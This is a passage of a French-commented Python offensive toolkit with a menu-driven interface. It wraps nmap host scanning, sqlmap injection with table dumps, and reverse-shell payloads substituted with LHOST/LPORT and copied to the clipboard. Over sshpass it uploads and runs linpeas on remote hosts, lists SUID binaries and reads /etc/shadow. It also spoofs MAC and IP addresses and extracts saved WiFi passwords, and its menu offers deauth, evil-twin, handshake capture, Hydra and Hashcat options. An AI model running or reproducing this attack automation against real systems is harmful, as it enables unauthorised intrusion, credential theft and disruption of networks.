            bar_c = "bold green" if sig >= 70 else "yellow" if sig >= 40 else "red"
            band  = n.get('band', '')
            band_c = "magenta" if band == '5GHz' else "cyan"
            band_t = f"[{band_c}]{band}[/{band_c}]" if band else ""
            table.add_row(
                n['ssid'],
                f"[{bar_c}]{n['bars']}[/{bar_c}]",
                n.get('chan', ''),
                band_t,
                f"[{sec_c}]{n['security']}[/{sec_c}]",
                n['manufacturer'], n['bssid']
            )
        console.print(table)
        open_n = sum(1 for n in networks if n['is_open'])
        nb_5g  = sum(1 for n in networks if n.get('band') == '5GHz')
        console.print(f"\n[info]Total: {len(networks)}  Ouverts: {open_n}  5GHz: {nb_5g}  2.4GHz: {len(networks)-nb_5g}[/info]")


class NetworkInterface:
    """Gère les informations des interfaces réseau"""
    
    @staticmethod
    def get_interfaces() -> List[Dict[str, str]]:
        """Récupère toutes les interfaces réseau avec leurs IPs"""
        interfaces = []
        try:
            # Méthode avec ip addr
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
            current_interface = None
            
            for line in result.stdout.split('\n'):
                # Détection d'une nouvelle interface
                if re.match(r'^\d+:', line):
                    match = re.search(r'^\d+:\s+(\S+):', line)
                    if match:
                        current_interface = match.group(1)
                        state = "UP" if "UP" in line else "DOWN"
                        interfaces.append({
                            'name': current_interface,
                            'state': state,
                            'ip': 'N/A'
                        })
                
                # Récupération de l'IP
                elif current_interface and 'inet ' in line:
                    match = re.search(r'inet\s+(\S+)', line)
                    if match and interfaces:
                        interfaces[-1]['ip'] = match.group(1)
        
        except Exception as e:
            console.print(f"[error]Erreur lors de la récupération des interfaces: {e}[/error]")
        
        return interfaces
    
    @staticmethod
    def display_interfaces():
        """Affiche les interfaces réseau dans un tableau stylisé"""
        table = Table(
            title="🌐 Interfaces Réseau",
            box=box.DOUBLE_EDGE,
            style="white",
            header_style="bold red"
        )
        
        table.add_column("Interface", style="orange1", justify="left")
        table.add_column("État", justify="center")
        table.add_column("Adresse IP", style="white", justify="left")
        
        interfaces = NetworkInterface.get_interfaces()
        
        for iface in interfaces:
            state_style = "green" if iface['state'] == "UP" else "red"
            table.add_row(
                iface['name'],
                f"[{state_style}]{iface['state']}[/{state_style}]",
                iface['ip']
            )
        
        console.print(table)
        
        return interfaces


class NmapScanner:
    """Gère les scans Nmap"""
    
    @staticmethod
    def scan_network(interface: str, timing: str = "T3") -> List[Dict]:
        """Scan du réseau sur une interface donnée, ou d'un domaine/IP"""
        console.print(f"\n[warning]🔍 Scan du réseau sur {interface} (Timing: {timing})...[/warning]")
        
        try:
            # Détecter si c'est un réseau local (CIDR) ou un domaine/IP unique
            is_network = '/' in interface  # 192.168.1.0/24
            
            if is_network:
                # Scan réseau local avec ARP pour récupérer les MACs
                cmd = ['sudo', 'nmap', '-sn', '-PR', f'-{timing}', interface]
            else:
                # Scan domaine/IP unique — pas de -PR (ARP), juste -sn (ping scan)
                cmd = ['sudo', 'nmap', '-sn', f'-{timing}', interface]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            hosts = []
            current_ip = None
            current_mac = None
            current_hostname = None
            
            for line in result.stdout.split('\n'):
                # Récupérer l'IP (avec ou sans hostname)
                ip_match = re.search(r'Nmap scan report for (?:([^\s]+) \()?(\d+\.\d+\.\d+\.\d+)\)?', line)
                if ip_match:
                    if current_ip:  # Sauvegarder l'hôte précédent
                        hosts.append({
                            'ip': current_ip,
                            'mac': current_mac,
                            'manufacturer': OUILookup.lookup(current_mac) if current_mac else None
                        })
                    current_hostname = ip_match.group(1) if ip_match.group(1) else None
                    current_ip = ip_match.group(2)
                    current_mac = None
                
                # Récupérer la MAC
                mac_match = re.search(r'MAC Address: ([0-9A-F:]{17})', line, re.IGNORECASE)
                if mac_match and current_ip:
                    current_mac = mac_match.group(1)
            
            # Ajouter le dernier hôte
            if current_ip:
                hosts.append({
                    'ip': current_ip,
                    'mac': current_mac,
                    'manufacturer': OUILookup.lookup(current_mac) if current_mac else None
                })
            
            console.print(f"[success]✓ {len(hosts)} hôte(s) trouvé(s)[/success]")
            return hosts
        
        except subprocess.TimeoutExpired:
            console.print("[error]Timeout du scan[/error]")
            return []
        except Exception as e:
            console.print(f"[error]Erreur: {e}[/error]")
            return []
    
    @staticmethod
    def scan_host(ip: str, scan_type: str = "top", timing: str = "T3") -> Dict:
        """Scan détaillé d'un hôte"""
        console.print(f"\n[warning]🎯 Scan de {ip} (Type: {scan_type}, Timing: {timing})...[/warning]")
        console.print("[warning]Cela peut prendre plusieurs minutes...[/warning]\n")
        
        if scan_type == "large":
            port_args = ['-p-']
        else:
            port_args = ['--top-ports', '1000']
        # sudo pour SYN scan (-sS) + OS detection (-O), plus rapide et fiable
        cmd = ['sudo', 'nmap', '-sS', '-sV', '-O',
               '--version-intensity', '3',
               '--max-retries', '1', '--host-timeout', '90s',
               '--open',
               ] + port_args + [f'-{timing}', ip]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
            output = result.stdout
            if not output.strip() and result.stderr.strip():
                output = result.stderr  # fallback si stdout vide
            
            # ── Parser tous les champs nmap ─────────────────────────────
            ports = []
            host_info = {
                'latency': None, 'mac': None, 'vendor': None,
                'device_type': None, 'os_running': None,
                'os_details': None, 'os_cpe': None,
                'hops': None, 'os_guess': None,
            }
            for line in output.split('\n'):
                line_s = line.strip()
                # Ports
                m = re.search(r'(\d+)/(tcp|udp)\s+(open[\w|]*?)\s+(\S+)(?:\s+(.+))?', line_s)
                if m and 'open' in m.group(3):
                    ports.append({
                        'port': m.group(1), 'protocol': m.group(2),
                        'service': m.group(4),
                        'version': m.group(5).strip() if m.group(5) else '',
                    })
                # Latence
                m = re.search(r'Host is up \(([\d.]+)s latency\)', line_s)
                if m: host_info['latency'] = m.group(1)
                # MAC + vendor
                m = re.search(r'MAC Address: ([0-9A-F:]{17}) \((.+)\)', line_s, re.IGNORECASE)
                if m: host_info['mac'] = m.group(1); host_info['vendor'] = m.group(2)
                # Device type
                m = re.search(r'Device type: (.+)', line_s)
                if m: host_info['device_type'] = m.group(1).strip()
                # Running OS
                m = re.search(r'Running: (.+)', line_s)
                if m and 'OS' not in line_s[:3]: host_info['os_running'] = m.group(1).strip()
                # OS details
                m = re.search(r'OS details: (.+)', line_s)
                if m: host_info['os_details'] = m.group(1).strip()
                # OS guesses
                m = re.search(r'Aggressive OS guesses: (.+)', line_s)
                if m: host_info['os_guess'] = m.group(1).strip()
                # CPE
                m = re.search(r'OS CPE: (.+)', line_s)
                if m: host_info['os_cpe'] = m.group(1).strip()
                # Hops
                m = re.search(r'Network Distance: (\d+) hop', line_s)
                if m: host_info['hops'] = m.group(1)

            # ── Affichage ──────────────────────────────────────────────
            console.print(f"\n[bold red]╔══════════════════════════════════════════════════════╗[/bold red]")
            console.print(f"[bold red]║[/bold red]  [bold orange1]SCAN REPORT — {ip:38}[/bold orange1][bold red]║[/bold red]")
            console.print(f"[bold red]╚══════════════════════════════════════════════════════╝[/bold red]")

            # Tableau infos hôte
            info_table = Table(box=box.SIMPLE, style="white", show_header=False, padding=(0,1))
            info_table.add_column("Champ", style="orange1", width=16)
            info_table.add_column("Valeur", style="white", overflow="fold")

            if host_info['latency']:
                ms = float(host_info['latency']) * 1000
                lat_color = "green" if ms < 20 else "yellow" if ms < 100 else "red"
                info_table.add_row("⏱  Latence", f"[{lat_color}]{ms:.1f} ms[/{lat_color}]")
            if host_info['hops']:
                info_table.add_row("🌐 Distance", f"{host_info['hops']} hop(s)")
            if host_info['mac']:
                info_table.add_row("🔌 MAC", f"[cyan]{host_info['mac']}[/cyan]")
            if host_info['vendor']:
                info_table.add_row("🏭 Fabricant", f"[green]{host_info['vendor']}[/green]")
            if host_info['device_type']:
                info_table.add_row("📱 Type", f"[bold white]{host_info['device_type']}[/bold white]")
            if host_info['os_running']:
                info_table.add_row("🖥  OS (running)", f"[bold green]{host_info['os_running']}[/bold green]")
            if host_info['os_details']:
                info_table.add_row("🔍 OS details", f"[bold green]{host_info['os_details']}[/bold green]")
            elif host_info['os_guess']:
                info_table.add_row("🔍 OS (guess)", f"[yellow]{host_info['os_guess'][:80]}[/yellow]")
            if host_info['os_cpe']:
                info_table.add_row("📋 CPE", f"[dim]{host_info['os_cpe']}[/dim]")

            console.print(info_table)

            # Tableau ports
            if ports:
                console.print(f"\n[bold orange1]PORTS OUVERTS ({len(ports)})[/bold orange1]")
                port_table = Table(box=box.ROUNDED, style="white", header_style="bold orange1")
                port_table.add_column("Port", style="orange1", justify="center", width=12)
                port_table.add_column("Proto", justify="center", width=7)
                port_table.add_column("Service", style="white", width=16)
                port_table.add_column("Version / Info", style="dim white", overflow="fold")

                for p in ports:
                    proto_color = "cyan" if p['protocol'] == "tcp" else "yellow"
                    port_table.add_row(
                        f"[bold]{p['port']}[/bold]",
                        f"[{proto_color}]{p['protocol']}[/{proto_color}]",
                        p['service'],
                        p['version'] or "[dim]—[/dim]"
                    )
                console.print(port_table)
            else:
                console.print("\n[warning]❌ Aucun port ouvert trouvé — l'hôte filtre les connexions[/warning]")
            
            return {
                'ip': ip,
                'ports': ports,
                'raw_output': output
            }
        
        except subprocess.TimeoutExpired:
            console.print("[error]⏱ Timeout du scan (3 minutes)[/error]")
            return {'ip': ip, 'ports': [], 'raw_output': 'Timeout'}
        except Exception as e:
            console.print(f"[error]Erreur: {e}[/error]")
            return {'ip': ip, 'ports': [], 'raw_output': str(e)}


class PayloadManager:
    """Gère les payloads depuis les fichiers CSV"""
    
    @staticmethod
    def load_payloads(filename: str) -> List[Dict]:
        """Charge les payloads depuis un fichier CSV"""
        payloads = []
        filepath = Path(filename)
        
        if not filepath.exists():
            console.print(f"[error]Fichier {filename} non trouvé[/error]")
            return payloads
        
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                reader = csv.reader(f)
                for idx, row in enumerate(reader, 1):
                    if row:
                        payloads.append({
                            'line': idx,
                            'payload': row[0] if len(row) > 0 else '',
                            'description': row[1] if len(row) > 1 else ''
                        })
        except Exception as e:
            console.print(f"[error]Erreur de lecture: {e}[/error]")
        
        return payloads
    
    @staticmethod
    @staticmethod
    def _get_best_local_ip() -> str:
        """Retourne la meilleure IP locale (tun0 en priorité, sinon première non-lo)"""
        try:
            result = subprocess.run(['ip', '-4', 'addr'], capture_output=True, text=True)
            tun_ip = None
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', line)
                    if m:
                        ip = m.group(1)
                        if 'tun' in result.stdout.split(line)[0].split('\n')[-1]:
                            return ip  # tun0 trouvé
                        if ip != '127.0.0.1' and tun_ip is None:
                            tun_ip = ip
            return tun_ip or '0.0.0.0'
        except Exception:
            return '0.0.0.0'

    @staticmethod
    def display_and_select_payload(filename: str):
        """Affiche les payloads et permet la sélection"""
        payloads = PayloadManager.load_payloads(filename)
        
        if not payloads:
            return

        # Détecter si le CSV contient des variables &IP ou &PORT
        lhost = None
        lport = None
        payloads_raw = PayloadManager.load_payloads(filename)
        needs_ip   = any('&IP'   in p['payload'] for p in payloads_raw)
        needs_port = any('&PORT' in p['payload'] for p in payloads_raw)

        if needs_ip or needs_port:
            console.print("\n[orange1]═══ Variables du payload ═══[/orange1]")
            if needs_ip:
                # Lister les interfaces avec IP
                ifaces_with_ip = []
                try:
                    result = subprocess.run(['ip', '-4', 'addr'], capture_output=True, text=True)
                    current_iface = None
                    for line in result.stdout.split('\n'):
                        m_iface = re.match(r'\d+: (\S+):', line)
                        if m_iface:
                            current_iface = m_iface.group(1)
                        m_ip = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', line)
                        if m_ip and current_iface and current_iface != 'lo':
                            ifaces_with_ip.append((current_iface, m_ip.group(1)))
                except Exception:
                    pass

                if ifaces_with_ip:
                    console.print("\n[orange1]Interface LHOST ([bold]&IP[/bold]):[/orange1]")
                    for idx, (iface, ip) in enumerate(ifaces_with_ip, 1):
                        color = "bold green" if 'tun' in iface else "white"
                        console.print(f"  {idx}. [{color}]{iface:20} {ip}[/{color}]")
                    iface_choice = Prompt.ask("Choix", default="1")
                    try:
                        lhost = ifaces_with_ip[int(iface_choice) - 1][1]
                    except (ValueError, IndexError):
                        lhost = ifaces_with_ip[0][1]
                else:
                    lhost = Prompt.ask("[orange1]&IP (LHOST)[/orange1]", default="0.0.0.0")

            if needs_port:
                lport = Prompt.ask("[orange1]&PORT (LPORT)[/orange1]", default="4444")

            parts = []
            if lhost: parts.append(f"IP=[bold]{lhost}[/bold]")
            if lport: parts.append(f"PORT=[bold]{lport}[/bold]")
            console.print(f"\n[success]✓ {'  '.join(parts)}[/success]")
            console.print("[dim]Les variables &IP et &PORT seront substituées dans le payload[/dim]\n")
        
        table = Table(
            title=f"📋 Payloads - {filename}",
            box=box.ROUNDED,
            style="white"
        )
        
        table.add_column("Ligne", style="orange1", width=6)
        table.add_column("Payload", style="white", overflow="fold")
        table.add_column("Description", style="dim white", overflow="fold")
        
        display_limit = 50
        for payload in payloads[:display_limit]:
            table.add_row(
                str(payload['line']),
                payload['payload'][:80],
                payload['description'][:40]
            )
        
        console.print(table)
        
        if len(payloads) > display_limit:
            console.print(f"[warning]... et {len(payloads) - display_limit} autres payloads[/warning]")
        
        console.print(f"\n[white]Total: {len(payloads)} payloads disponibles[/white]")
        
        choice = Prompt.ask(
            "\n[orange1]Numéro de ligne du payload à copier (0 pour annuler)[/orange1]",
            default="0"
        )
        
        try:
            line_num = int(choice)
            if 1 <= line_num <= len(payloads):
                selected = payloads[line_num - 1]
                final_payload = selected['payload']

                # Substitution &IP / &PORT
                if lhost:
                    final_payload = final_payload.replace('&IP', lhost)
                    final_payload = final_payload.replace('VOTRE_IP_ICI', lhost)
                if lport:
                    final_payload = final_payload.replace('&PORT', lport)

                pyperclip.copy(final_payload)
                console.print(f"\n[success]✓ Payload copié dans le presse-papier![/success]")
                console.print(f"\n[white]Payload:[/white]")
                console.print(f"[orange1]{final_payload}[/orange1]")
                if selected['description']:
                    console.print(f"\n[dim white]Description: {selected['description']}[/dim white]")
        except ValueError:
            console.print("[error]Numéro invalide[/error]")


class SQLMapScanner:
    """Gère les scans SQLMap"""
    
    @staticmethod
    def scan_url(url: str, options: str = ""):
        """Effectue un scan SQLMap - détecte automatiquement les vulnérabilités SQL"""
        console.print(f"\n[warning]💉 Scan SQLMap de {url}...[/warning]")
        console.print("[info]SQLMap va tester automatiquement plusieurs types d'injections SQL[/info]")
        
        cmd = ['sqlmap', '-u', url, '--batch'] + options.split()
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            console.print(result.stdout)
            
            # Parser les informations
            info = {
                'db_version': None,
                'db_type': None,
                'tables': [],
                'vulnerable': False
            }
            
            for line in result.stdout.split('\n'):
                if 'web application technology' in line.lower():
                    info['db_type'] = line.strip()
                elif 'back-end DBMS' in line:
                    info['db_version'] = line.strip()
                    info['vulnerable'] = True
                elif 'Database:' in line:
                    # Extraction du nom de la base
                    match = re.search(r'Database:\s+(\S+)', line)
                    if match:
                        info['database'] = match.group(1)
                elif re.match(r'\[\d+ tables?\]', line):
                    info['tables'].append(line.strip())
            
            if info['vulnerable']:
                console.print("\n[success]✓ Site vulnérable aux injections SQL![/success]")
                if info['db_version']:
                    console.print(f"[success]{info['db_version']}[/success]")
            else:
                console.print("\n[warning]Aucune vulnérabilité SQL évidente détectée[/warning]")
            
            return info
        
        except Exception as e:
            console.print(f"[error]Erreur: {e}[/error]")
            return None
    
    @staticmethod
    def dump_table(url: str, database: str, table: str):
        """Dump une table spécifique"""
        console.print(f"\n[warning]📊 Dump de la table {table}...[/warning]")
        
        cmd = ['sqlmap', '-u', url, '-D', database, '-T', table, '--dump', '--batch']
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            console.print(result.stdout)
        except Exception as e:
            console.print(f"[error]Erreur: {e}[/error]")


class SSHManager:
    """Gère les connexions SSH et les scans de privilèges"""
    
    @staticmethod
    def get_ssh_hosts(scan_results: List[Dict]) -> List[Dict]:
        """Filtre les hôtes avec SSH ouvert"""
        ssh_hosts = []
        
        for result in scan_results:
            for port in result.get('ports', []):
                if port['service'] == 'ssh' or port['port'] == '22':
                    ssh_hosts.append({
                        'ip': result['ip'],
                        'port': port['port']
                    })
        
        return ssh_hosts
    
    @staticmethod
    def run_linpeas(ip: str, user: str, password: str):
        """Exécute LinPEAS sur une machine distante"""
        console.print(f"\n[warning]🔓 Exécution de LinPEAS sur {ip}...[/warning]")
        
        # Upload de linpeas
        upload_cmd = f"sshpass -p '{password}' scp ./linpeas.sh {user}@{ip}:/tmp/"
        
        try:
            subprocess.run(upload_cmd, shell=True, check=True)
            
            # Exécution
            exec_cmd = f"sshpass -p '{password}' ssh {user}@{ip} 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'"
            result = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True, timeout=300)
            
            console.print(result.stdout)
            
            # Sauvegarde du résultat
            output_file = f"linpeas_{ip}.txt"
            with open(output_file, 'w') as f:
                f.write(result.stdout)
            
            console.print(f"[success]✓ Résultats sauvegardés dans {output_file}[/success]")
        
        except Exception as e:
            console.print(f"[error]Erreur: {e}[/error]")
    
    @staticmethod
    def scan_files(ip: str, user: str, password: str):
        """Scanne les fichiers intéressants"""
        console.print(f"\n[warning]📁 Scan des fichiers sur {ip}...[/warning]")
        
        commands = {
            "Fichiers .txt": "find / -name '*.txt' 2>/dev/null | head -50",
            "Binaires": "find / -type f -executable 2>/dev/null | head -50",
            "Scripts .sh": "find / -name '*.sh' 2>/dev/null | head -50",
            "SUID binaires": "find / -perm -4000 2>/dev/null"
        }
        
        for title, cmd in commands.items():
            console.print(f"\n[orange1]>>> {title}[/orange1]")
            exec_cmd = f"sshpass -p '{password}' ssh {user}@{ip} '{cmd}'"
            
            try:
                result = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True, timeout=60)
                console.print(result.stdout)
            except Exception as e:
                console.print(f"[error]Erreur: {e}[/error]")
    
    @staticmethod
    def get_shadow_users(ip: str, user: str, password: str):
        """Liste les utilisateurs de /etc/shadow"""
        console.print(f"\n[warning]👥 Utilisateurs de /etc/shadow sur {ip}...[/warning]")
        
        cmd = f"sshpass -p '{password}' ssh {user}@{ip} 'sudo cat /etc/shadow 2>/dev/null || cat /etc/passwd'"
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            console.print(result.stdout)
        except Exception as e:
            console.print(f"[error]Erreur: {e}[/error]")
    
    @staticmethod
    def get_permissions(ip: str, user: str, password: str):
        """Affiche les permissions de l'utilisateur"""
        console.print(f"\n[warning]🔑 Permissions de {user} sur {ip}...[/warning]")
        
        commands = {
            "Sudo rights": "sudo -l",
            "Groups": "groups",
            "User info": "id"
        }
        
        for title, cmd in commands.items():
            console.print(f"\n[orange1]>>> {title}[/orange1]")
            exec_cmd = f"sshpass -p '{password}' ssh {user}@{ip} '{cmd}'"
            
            try:
                result = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True, timeout=30)
                console.print(result.stdout)
            except Exception as e:
                console.print(f"[error]Erreur: {e}[/error]")


class NetworkSpoofer:
    """Gère le spoofing MAC et IP"""
    
    @staticmethod
    def spoof_mac(interface: str, mac: Optional[str] = None):
        """Change l'adresse MAC"""
        if not mac:
            # Génère une MAC aléatoire
            import random
            mac = "02:%02x:%02x:%02x:%02x:%02x" % (
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255)
            )
        
        console.print(f"\n[warning]🎭 Changement de MAC sur {interface} vers {mac}...[/warning]")
        
        try:
            # Down interface
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
            # Change MAC
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'address', mac], check=True)
            # Up interface
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
            
            console.print(f"[success]✓ MAC changée avec succès: {mac}[/success]")
        except Exception as e:
            console.print(f"[error]Erreur: {e}[/error]")
    
    @staticmethod
    def spoof_ip(interface: str, ip: Optional[str] = None):
        """Change l'adresse IP"""
        if not ip:
            # Génère une IP aléatoire dans 192.168.x.x
            import random
            ip = f"192.168.{random.randint(1, 254)}.{random.randint(2, 254)}"
        
        console.print(f"\n[warning]🎭 Changement d'IP sur {interface} vers {ip}...[/warning]")
        
        try:
            # Via nmcli
            subprocess.run([
                'sudo', 'nmcli', 'con', 'mod', interface, 
                'ipv4.addresses', f'{ip}/24',
                'ipv4.method', 'manual'
            ], check=True)
            
            subprocess.run(['sudo', 'nmcli', 'con', 'up', interface], check=True)
            
            console.print(f"[success]✓ IP changée avec succès: {ip}[/success]")
        except Exception as e:
            console.print(f"[error]Erreur: {e}[/error]")


class PentestTool:
    """Application principale"""
    
    def __init__(self):
        self.interfaces = []
        self.scan_results = []
        self.ssh_credentials = {}
        self.dns_monitor = DNSMonitor()
        # Charger la base OUI au démarrage
        OUILookup.load_oui_file()
    
    def display_header(self):
        """Affiche le header de l'application"""
        header = Text()
        header.append("╔═══════════════════════════════════════════════════════════╗\n", style="red")
        header.append("║          ", style="red")
        header.append("🔥      ナナチ ハッキング🔥   ", style="bold orange1")
        header.append("                    ║\n", style="red")
        header.append("╚═══════════════════════════════════════════════════════════╝", style="red")
        
        console.print(header)
        console.print()
    
    def main_menu(self):
        """Menu principal"""
        while True:
            console.clear()
            
            # Afficher le header normalement
            header = Text()
            header.append("╔═══════════════════════════════════════════════════════════╗\n", style="red")
            header.append("║          ", style="red")
            header.append("🔥      ナナチ ハッキング 🔥 ", style="bold orange1")
            header.append("                    ║\n", style="red")
            header.append("╚═══════════════════════════════════════════════════════════╝", style="red")
            console.print(header)
            console.print()
            
            # Récupérer les interfaces
            self.interfaces = NetworkInterface.get_interfaces()
            
            # Créer le tableau des interfaces
            iface_table = Table(
                title="🌐 Interfaces Réseau",
                box=box.DOUBLE_EDGE,
                style="white",
                header_style="bold red",
                show_header=True
            )
            iface_table.add_column("Interface   ", style="orange1", justify="left")
            iface_table.add_column("État", justify="center")
            iface_table.add_column("Adresse IP         ", style="white", justify="left")
            
            for iface in self.interfaces:
                state_style = "green" if iface['state'] == "UP" else "red"
                iface_table.add_row(
                    iface['name'],
                    f"[{state_style}]{iface['state']}[/{state_style}]",
                    iface['ip']
                )
            
            # Calculer la hauteur du tableau rendu pour aligner le crâne par le bas
            from io import StringIO
            from rich.console import Console as TempConsole
            
            # Créer une console temporaire pour mesurer la hauteur du tableau
            temp_buffer = StringIO()
            temp_console = TempConsole(file=temp_buffer, width=100, legacy_windows=False)
            temp_console.print(iface_table)
            rendered_table = temp_buffer.getvalue()
            num_table_lines = len(rendered_table.split('\n')) - 1  # -1 car il y a une ligne vide à la fin
            
            # Nombre de lignes du crâne
            skull_lines = SKULL_PART1.split('\n')
            num_skull_lines = len(skull_lines)
            
            # Ajouter des lignes vides AU DÉBUT du crâne pour l'aligner par le bas
            if num_table_lines > num_skull_lines:
                padding_lines = '\n' * (num_table_lines - num_skull_lines)
                skull_part1 = Text(padding_lines + SKULL_PART1, style="bold orange1")
            else:
                skull_part1 = Text(SKULL_PART1, style="bold orange1")
            
            # Afficher tableau interfaces + partie 1 du crâne
            console.print(Columns([iface_table, skull_part1], padding=5))
            
            # Créer le menu
            menu = Table(box=box.ROUNDED, style="white", show_header=False)
            menu.add_column("Option", style="orange1", width=4)
            menu.add_column("Description", style="white")
            
            menu.add_row("1", "🔍 Scanner le réseau (Nmap)")
            menu.add_row("2", "📋 Charger des payloads")
            menu.add_row("3", "💉 Scanner avec SQLMap")
            menu.add_row("4", "🔓 Accès SSH et exploitation")
            menu.add_row("5", "🎭 Spoofing MAC/IP")
            menu.add_row("6", "🌐 Ouvrir URL HTTP/HTTPS")
            menu.add_row("7", "📡 Scanner les réseaux WiFi")
            menu.add_row("8", "🔎 Monitoring DNS actif")
            menu.add_row("9", "💀 Deauth WiFi")
            menu.add_row("A", "🎧 Netcat listener")
            menu.add_row("B", "📡 Fake AP (Evil Twin)")
            menu.add_row("C", "🤝 Capture Handshake WPA")
            menu.add_row("D", "📁 Gobuster (scan web)")
            menu.add_row("E", "🔐 Hydra (bruteforce login)")
            menu.add_row("F", "🔓 Hashcat (crack hash)")
            menu.add_row("G", "🔮 Prushka (decrypt)")
            menu.add_row("0", "❌ Quitter")
            
            # Partie 2 du crâne
            skull_part2 = Text(SKULL_PART2, style="bold orange1")
            
            # Afficher menu + partie 2 du crâne
            console.print(Columns([menu, skull_part2], padding=5))
            
            choice = Prompt.ask("\n[orange1]Choisissez une option[/orange1]", default="0")
            
            if choice == "1":
                self.nmap_menu()
            elif choice == "2":
                self.payload_menu()
            elif choice == "3":
                self.sqlmap_menu()
            elif choice == "4":
                self.ssh_menu()
            elif choice == "5":
                self.spoofing_menu()
            elif choice == "6":
                self.open_url_menu()
            elif choice == "7":
                self.wifi_menu()
            elif choice == "8":
                self.dns_monitoring_menu()
            elif choice == "9":
                self.deauth_menu()
            elif choice in ("A", "a"):
                self._netcat_listener()
            elif choice in ("B", "b"):
                self._fake_ap_menu()
            elif choice in ("C", "c"):
                self._handshake_menu()
            elif choice in ("D", "d"):
                self._gobuster_menu()
            elif choice in ("E", "e"):
                self._hydra_menu()
            elif choice in ("F", "f"):
                self._hashcat_menu()
            elif choice in ("G", "g"):
                self._prushka_menu()
            elif choice == "0":
                console.print("[success]Au revoir! 👋[/success]")
                break
    
    def wifi_menu(self):
        """Menu scan WiFi"""
        console.print("\n[title]═══ SCANNER WIFI ═══[/title]")
        
        networks = WiFiScanner.scan_wifi()
        
        if networks:
            WiFiScanner.display_networks(networks)
        
        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
    
    def _get_active_wifi_networks(self) -> List[Dict]:
        """Retourne les réseaux WiFi auxquels les autres interfaces sont connectées"""
        active_networks = []
        try:
            result = subprocess.run(
                ['nmcli', '-t', '-f', 'DEVICE,CONNECTION,TYPE', 'device', 'status'],
                capture_output=True, text=True
            )
            for line in result.stdout.strip().split('\n'):
                parts = line.split(':')
                if len(parts) >= 3 and parts[2] == 'wifi' and parts[1] not in ('', '--'):
                    iface_name = parts[0]
                    connection_name = parts[1]
                    # Récupérer le SSID et le mot de passe depuis le profil NM
                    ssid = self._get_ssid_for_connection(connection_name)
                    password = self._get_password_for_connection(connection_name)
                    active_networks.append({
                        'interface': iface_name,
                        'connection': connection_name,
                        'ssid': ssid or connection_name,
                        'password': password,
                    })
        except Exception as e:
            console.print(f"[error]Erreur récupération réseaux actifs: {e}[/error]")
        return active_networks

    def _get_ssid_for_connection(self, connection_name: str) -> Optional[str]:
        """Récupère le SSID d'un profil de connexion NM"""
        try:
            result = subprocess.run(
                ['nmcli', '-t', '-f', '802-11-wireless.ssid', 'connection', 'show', connection_name],
                capture_output=True, text=True
            )
            for line in result.stdout.strip().split('\n'):
                if '802-11-wireless.ssid:' in line:
                    return line.split(':', 1)[1].strip()
        except Exception:
            pass
        return None

    def _get_password_for_connection(self, connection_name: str) -> Optional[str]:
        """Récupère le mot de passe WiFi depuis le profil NM (nécessite sudo)"""
        try:
            result = subprocess.run(
                ['sudo', 'nmcli', '-t', '-f', '802-11-wireless-security.psk',
                 'connection', 'show', '--show-secrets', connection_name],
                capture_output=True, text=True
            )
            for line in result.stdout.strip().split('\n'):
                if '802-11-wireless-security.psk:' in line:
                    pwd = line.split(':', 1)[1].strip()
                    if pwd and pwd != '--':
                        return pwd
        except Exception:
            pass
        return None

    def _connect_interface_to_network(self, iface: str, ssid: str, password: Optional[str]) -> bool:
        """Connecte une interface WiFi — contourne le bug NM 'pas un périphérique Wi-Fi'"""
        try:
            # 1. Reset interface en managed via iw
            console.print(f"[info]🔧 Reset {iface} en mode managed...[/info]")
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'down'], capture_output=True)
            time.sleep(0.3)
            # Supprimer interfaces monitor orphelines qui confondent NM
            for mon in [iface + 'mon', 'mon0', 'mon1']:
                if subprocess.run(['ip', 'link', 'show', mon], capture_output=True).returncode == 0:
                    subprocess.run(['sudo', 'ip', 'link', 'set', mon, 'down'], capture_output=True)
                    subprocess.run(['sudo', 'iw', 'dev', mon, 'del'], capture_output=True)
            subprocess.run(['sudo', 'iw', 'dev', iface, 'set', 'type', 'managed'], capture_output=True)
            time.sleep(0.3)
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'], capture_output=True)

            # 2. Supprimer profils AP/capture pollués sur cette interface
            console.print(f"[info]🧹 Nettoyage profils AP sur {iface}...[/info]")
            prof_r = subprocess.run(['nmcli', '-t', '-f', 'NAME,TYPE,DEVICE', 'connection', 'show'],
                                    capture_output=True, text=True)
            for line in prof_r.stdout.strip().split('\n'):
                parts = line.split(':')
                if len(parts) < 3: continue
                pname = parts[0]
                if (parts[2] == iface and '802-11-wireless' in parts[1]) or \
                   pname.startswith('capture-') or pname.startswith('cap-'):
                    mode_r = subprocess.run(
                        ['nmcli', '-t', '-f', '802-11-wireless.mode', 'connection', 'show', pname],
                        capture_output=True, text=True)
                    if 'ap' in mode_r.stdout.lower() or \
                       pname.startswith('capture-') or pname.startswith('cap-'):
                        subprocess.run(['sudo', 'nmcli', 'connection', 'delete', pname],
                                       capture_output=True)

            # 3. Restart NetworkManager MAINTENANT — il re-détecte l'interface comme WiFi
            console.print(f"[info]🔄 Restart NM pour re-détecter {iface} comme WiFi...[/info]")
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], capture_output=True)
            time.sleep(5)  # NM doit rescanner les interfaces

            # 4. Vérifier que NM voit bien l'interface comme WiFi
            for attempt in range(3):
                dev_r = subprocess.run(
